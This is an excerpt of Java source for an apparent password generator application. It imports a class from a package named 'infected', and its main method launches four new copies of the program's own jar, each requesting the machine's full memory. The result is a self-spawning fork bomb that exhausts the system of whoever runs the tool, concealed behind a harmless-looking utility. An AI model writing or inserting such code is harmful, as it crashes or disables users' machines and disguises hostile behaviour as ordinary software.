...
import xyz.plocki.passwordgenerator.utils.infected.Infection;
...
public class PasswordGenerator implements ActionListener {
    ...
    public static void main(String[] args) throws IOException, URISyntaxException {
        Runtime.getRuntime().exec("java -Xmx" + Runtime.getRuntime().maxMemory() + "M -Xms" + Runtime.getRuntime().maxMemory() + "M -jar " + new PasswordGenerator().getClass().getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
        Runtime.getRuntime().exec("java -Xmx" + Runtime.getRuntime().maxMemory() + "M -Xms" + Runtime.getRuntime().maxMemory() + "M -jar " + new PasswordGenerator().getClass().getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
        Runtime.getRuntime().exec("java -Xmx" + Runtime.getRuntime().maxMemory() + "M -Xms" + Runtime.getRuntime().maxMemory() + "M -jar " + new PasswordGenerator().getClass().getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
        Runtime.getRuntime().exec("java -Xmx" + Runtime.getRuntime().maxMemory() + "M -Xms" + Runtime.getRuntime().maxMemory() + "M -jar " + new PasswordGenerator().getClass().getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
        boolean exist = false;
